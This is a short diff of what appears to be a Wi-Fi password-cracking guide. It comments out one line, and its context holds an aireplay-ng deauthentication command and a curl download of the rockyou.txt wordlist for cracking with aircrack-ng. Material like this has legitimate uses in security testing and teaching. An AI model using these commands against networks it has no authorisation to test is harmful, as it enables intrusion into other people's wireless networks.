@@ -23,7 +23,7 @@ aireplay-ng -0 2 -a <BSSID> -c <CLIENT> mon0
 
 ########## crack password with aircrack-ng… ########### 
 
-download 134MB rockyou.txt dictionary file if needed
+#download 134MB rockyou.txt dictionary file if needed
 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 # crack w/ aircrack-ng
